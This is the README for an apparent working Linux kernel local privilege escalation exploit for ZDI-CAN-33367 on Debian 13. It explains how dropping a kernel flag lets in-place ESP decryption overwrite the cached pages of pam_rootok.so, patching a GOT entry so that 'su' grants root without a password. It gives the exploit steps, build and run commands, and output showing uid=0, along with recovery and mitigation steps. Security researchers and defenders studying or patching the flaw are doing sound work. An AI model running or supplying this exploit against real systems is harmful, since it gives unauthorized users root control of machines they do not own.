# ZDI-CAN-33367 — Linux Kernel LPE via skb_zerocopy page-cache write

Independent reproduction of the Linux kernel local privilege escalation
tracked as **ZDI-CAN-33367** ("skb_zerocopy Shared-Frag Flag Drop").

Confirmed on **Debian 13 (trixie)** kernel `6.12.113+deb13-amd64`
with `libpam-modules 1.7.0-5`, no special configuration required.

---

## Legal

> **This code is provided for educational and authorized security research only.**
>
> You may run this tool **only** on systems you own or have **explicit written
> permission** to test. Using this tool against systems without authorization
> is illegal under the Computer Fraud and Abuse Act (CFAA), the Computer
> Misuse Act, and equivalent laws in most jurisdictions.
>
> The authors accept no liability for any misuse or damage caused by this
> software. By downloading, building, or running this code you accept full
> responsibility for your actions and confirm that you have the legal right
> to test the target system.

---

## Why This Works

### The Bug

`skb_zerocopy()` in `net/core/skbuff.c` copies socket-buffer fragments from
one skb to another but silently **drops the `SKBFL_SHARED_FRAG` ownership
flag**. This flag marks that the fragment's backing page is shared (not
privately owned by the skb).

### Why the Flag Matters

The ESP (IPsec) receive path decrypts packets **in-place**. Before doing so it
calls `skb_cow_data()`, which is supposed to make a private copy of any shared
data before overwriting it. The check inside `skb_cow_data()` reads:

```c
if (!skb_has_shared_frag(skb))   // checks SKBFL_SHARED_FRAG
    return 0;                    // no copy needed — safe to decrypt in place
```

Because `skb_zerocopy()` dropped the flag, `skb_cow_data()` skips the copy.
AES-CBC decryption then writes its output **directly into the page-cache page
of the source file** — even if that file is root-owned and read-only on disk.

### How the Exploit Uses It

```
1. splice(pam_rootok.so → udp socket)
   → creates an skb whose fragment points at the pam_rootok.so page-cache page

2. NFQUEUE intercepts the outgoing UDP packet in userspace

3. TC pedit rewrites 96 bytes of the packet
   → transforms the UDP packet into a valid ESP (IPsec) packet
   → crafted IV + ciphertext so that AES-CBC decrypt produces desired bytes

4. Kernel ESP receive path decrypts in-place
   → writes controlled bytes into pam_rootok.so page cache
   → patches out the getuid() == 0 check (GOT entry 0x508: 5013 → 1015)

5. su -c id
   → pam_rootok calls getuid(), GOT redirects to always return 0
   → su grants root without a password
```

The mutation is **page-cache only** — the on-disk file is never modified and
is restored by evicting the page (`posix_fadvise POSIX_FADV_DONTNEED`) or
rebooting.

### Why No Launcher on Debian 13

Ubuntu 24.04+ enforces `apparmor_restrict_unprivileged_userns=1`, which blocks
unprivileged `unshare(CLONE_NEWUSER)` and requires a privileged launcher
(podman, newuidmap, etc.). Debian 13 ships **without this sysctl**, so any
unprivileged user can create a user namespace directly — no launcher needed.

---

## Affected Systems

| Distribution | Kernel | Status |
|---|---|---|
| Debian 13 (trixie) | 6.12.113+deb13-amd64 | **vulnerable** |
| Ubuntu 26.04 | 7.0.0-42-generic | vulnerable (requires launcher) |
| AlmaLinux 10.2 | 6.12.0-211.33.1.el10_2 | patched 2026-10-28 |

Upstream fix (not yet in Debian trixie as of 2026-10-30):
https://lists.openwall.net/netdev/2026/10/22/204

---

## Build

```bash
# Install dependencies (Debian 13)
sudo apt install gcc libmnl-dev libssl-dev

# Build
git clone https://github.com/YOU/zerofrag-debian13
cd zerofrag-debian13
bash build.sh
```

---

## Usage

```bash
# Debian 13 — direct unshare, no launcher needed
./zerofrag

# Ubuntu 26.04 — requires launcher
./zerofrag --launcher podman

# Identify which profile matches current system
./zerofrag --identify
```

Expected output on Debian 13:

```
PROFILE_ID=debian13
MUTATE before=5013000000000000 after=1015000000000000
LPE_RESULT=PASS
FINAL_RESULT=PASS
```

```bash
su -c id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Recovery

The on-disk file is untouched. Evict the patched page from cache:

```bash
python3 -c "
import ctypes, ctypes.util, os
libc = ctypes.CDLL(ctypes.util.find_library('c'))
fd = os.open('/usr/lib/x86_64-linux-gnu/security/pam_rootok.so', os.O_RDONLY)
libc.posix_fadvise(fd, 0, 0, 4)
os.close(fd)
"
```

Or simply reboot.

---

## Temporary Mitigation

```bash
# /etc/modprobe.d/no-esp.conf
install esp4 /bin/true
install esp6 /bin/true
```

Disables the ESP receive path. IPsec will not function while active.

---

## References

| | |
|---|---|
| Original ZDI report | https://lore.kernel.org/lkml/BYAPR01MB3830CECF5D0871064C59BA0280662@BYAPR01MB3830.prod.exchangelabs.com/ |
| Upstream kernel fix | https://lists.openwall.net/netdev/2026/10/22/204 |
| Public PoC (lab binary) | https://github.com/FranklinF25/zdi-can-33367 |

This repository is an **independent reproduction** targeting the real
`pam_rootok.so` on a standard Debian 13 installation with full Debian-specific
profiling (AppArmor constraint, supplementary groups, kernel version matching).
